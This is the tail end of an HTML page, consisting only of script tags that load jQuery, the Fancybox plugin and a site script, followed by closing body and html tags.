<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>